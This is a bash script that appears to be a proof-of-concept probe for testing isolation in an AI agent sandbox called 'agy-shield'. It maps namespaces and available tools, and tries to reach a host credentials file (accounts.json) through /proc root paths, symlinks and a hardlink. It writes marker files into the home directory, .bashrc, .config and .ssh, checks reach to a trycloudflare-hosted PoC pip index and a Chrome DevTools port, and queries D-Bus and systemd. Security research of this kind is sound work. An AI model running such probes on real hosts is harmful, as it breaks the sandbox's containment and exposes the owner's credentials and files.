#!/bin/bash

set +e

probe_out="$PWD/.agy-shield-probe"
mkdir -p "$probe_out"

{
  printf 'probe_version=1\n'
  printf 'pid=%s\nppid=%s\nuid=%s\ngid=%s\npwd=%s\n' "$$" "$PPID" "$(id -u)" "$(id -g)" "$PWD"
  printf 'argv0=%s\narg1=%s\narg2=%s\n' "$0" "${1-}" "${2-}"
  printf 'HOME=%s\nPATH=%s\nTMPDIR=%s\nDISPLAY=%s\nXDG_RUNTIME_DIR=%s\nDBUS_SESSION_BUS_ADDRESS=%s\nSSH_AUTH_SOCK=%s\n' \
    "${HOME-}" "${PATH-}" "${TMPDIR-}" "${DISPLAY-}" "${XDG_RUNTIME_DIR-}" \
    "${DBUS_SESSION_BUS_ADDRESS-}" "${SSH_AUTH_SOCK-}"
  printf '\n[namespaces]\n'
  for namespace in cgroup ipc mnt net pid pid_for_children time time_for_children user uts; do
    printf '%s=' "$namespace"
    readlink "/proc/self/ns/$namespace" 2>&1
  done
  printf '\n[identity]\n'
  id 2>&1
  printf '\n[executables]\n'
  for executable in bash sh git python3 curl wget gdbus busctl systemctl xdotool unshare nsenter setpriv socat nc; do
    command -v "$executable" 2>&1 || true
  done
  printf '\n[python]\n'
  /usr/bin/python3 -c 'import os,sys; print(sys.executable); print("\\n".join(sys.path)); print("user_site=" + str(__import__("site").getusersitepackages())); print("mnt=" + os.readlink("/proc/self/ns/mnt"))' 2>&1
  /usr/bin/python3 -m pip --version 2>&1
  printf '\n[host-path-metadata]\n'
  for path in \
    /home/stazot \
    /home/stazot/.config \
    /home/stazot/.local \
    /home/stazot/.local/lib/python3.13/site-packages/pip \
    /home/stazot/.cargo \
    /home/stazot/HyveCLI/data \
    /home/stazot/HyveCLI/data/accounts.json \
    /run/user/1000 \
    /run/user/1000/bus \
    /tmp/.X11-unix; do
    if [ -e "$path" ]; then
      printf 'visible %s: ' "$path"
      stat -Lc 'mode=%a uid=%u gid=%g dev=%d ino=%i size=%s' "$path" 2>&1
    else
      printf 'hidden %s\n' "$path"
    fi
  done
  printf '\n[proc-root-oracles]\n'
  for root_path in \
    /proc/self/root/home/stazot/HyveCLI/data/accounts.json \
    "/proc/$PPID/root/home/stazot/HyveCLI/data/accounts.json" \
    /proc/1/root/home/stazot/HyveCLI/data/accounts.json; do
    printf '%s: ' "$root_path"
    wc -c "$root_path" 2>&1
  done
  printf '\n[direct-read-oracle]\n'
  wc -c /home/stazot/HyveCLI/data/accounts.json 2>&1
  printf '\n[tracked-symlink-read-oracle]\n'
  wc -c host-accounts-link 2>&1
  printf '\n[fd-links]\n'
  for descriptor in /proc/self/fd/*; do
    printf '%s -> ' "$descriptor"
    readlink "$descriptor" 2>&1
  done
} > "$probe_out/process.txt" 2>&1

cp /proc/self/status "$probe_out/status.txt" 2> "$probe_out/status-copy-error.txt"
cp /proc/self/mountinfo "$probe_out/mountinfo.txt" 2> "$probe_out/mountinfo-copy-error.txt"
cp /proc/net/unix "$probe_out/unix-sockets.txt" 2> "$probe_out/unix-copy-error.txt"
ls -la / "$HOME" /run/user/1000 /tmp/.X11-unix > "$probe_out/visible-tree.txt" 2>&1

{
  for target in \
    "$HOME/.agy-shield-direct-marker" \
    "$HOME/.bashrc.agy-shield-direct-marker" \
    "$HOME/.config/.agy-shield-direct-marker" \
    "$HOME/.local/share/.agy-shield-direct-marker" \
    "$HOME/.ssh/.agy-shield-direct-marker" \
    /home/stazot/HyveCLI/data/.agy-shield-direct-marker \
    /tmp/agy-shield-direct-marker; do
    printf 'direct %s: ' "$target"
    printf 'shield-direct-marker\n' > "$target" 2>/dev/null
    printf 'rc=%s exists=%s\n' "$?" "$([ -e "$target" ] && printf yes || printf no)"
  done

  printf 'symlink config: '
  printf 'shield-symlink-config-marker\n' > host-config-marker-link 2>/dev/null
  printf 'rc=%s target_exists=%s\n' "$?" "$([ -e /home/stazot/.config/agy-shield-symlink-marker ] && printf yes || printf no)"

  printf 'symlink tmp: '
  printf 'shield-symlink-tmp-marker\n' > host-tmp-marker-link 2>/dev/null
  printf 'rc=%s target_exists=%s\n' "$?" "$([ -e /tmp/agy-shield-symlink-marker ] && printf yes || printf no)"

  printf 'hardlink accounts: '
  ln /home/stazot/HyveCLI/data/accounts.json "$probe_out/accounts-hardlink" 2>&1
  link_rc=$?
  printf 'rc=%s ' "$link_rc"
  if [ "$link_rc" -eq 0 ]; then
    wc -c "$probe_out/accounts-hardlink" 2>&1
    rm -f "$probe_out/accounts-hardlink"
  else
    printf '\n'
  fi
} > "$probe_out/write-oracles.txt" 2>&1

{
  printf 'local_pep503: '
  curl -sS --max-time 5 -o /dev/null -w 'http=%{http_code}\n' \
    http://127.0.0.1:18765/simple/antigravity-fsmonitor-pip-poc/ 2>&1
  printf 'cloudflare_pep503: '
  curl -sS --max-time 8 -o /dev/null -w 'http=%{http_code}\n' \
    https://trek-fonts-adapted-jonathan.trycloudflare.com/simple/antigravity-fsmonitor-pip-poc/ 2>&1
  printf 'cdp: '
  curl -sS --max-time 5 -o /dev/null -w 'http=%{http_code}\n' http://127.0.0.1:9240/json/version 2>&1
} > "$probe_out/network-oracles.txt" 2>&1

{
  printf '[dbus]\n'
  gdbus call --session --dest org.freedesktop.DBus --object-path /org/freedesktop/DBus \
    --method org.freedesktop.DBus.ListNames 2>&1
  printf '[systemd-user]\n'
  systemctl --user show-environment 2>&1
} > "$probe_out/host-service-oracles.txt" 2>&1

printf 'runtime-probe-token\0'
